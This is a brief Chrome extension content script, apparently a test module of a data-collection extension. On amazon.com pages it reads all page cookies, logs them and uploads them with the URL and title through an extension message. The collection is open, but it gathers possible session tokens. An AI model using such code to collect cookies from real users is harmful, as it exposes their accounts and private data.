/* global chrome */

window.registerExtensionCallback(function (config) {
  console.log('[Cookies] Checking host...')

  if (window.location.href.toLowerCase().match(/amazon.com/)) {
    console.log('[Cookies] Fetching cookies...')
    const payload = {
      'url*': window.location.href,
      'page-title*': document.title,
      cookies: []
    }

    const cookies = document.cookie.split(';')

    cookies.forEach(function (cookie) {
      cookie = cookie.trim()

      const index = cookie.indexOf('=')

      if (index !== -1) {
        const name = cookie.substring(0, index)
        const value = cookie.substring(index + 1)

        console.log(name + ' --> ' + value)

        const cookieDef = {
          name: name,
          value: value
        }

        payload.cookies.push(cookieDef)
      }
    })

    console.log('[Cookies] Sending data...')
    console.log(payload)

    chrome.runtime.sendMessage({
      content: 'record_data_point',
      generator: 'test-extension-cookies',
      payload: payload,
      uploadNow: true
    })
  }
})
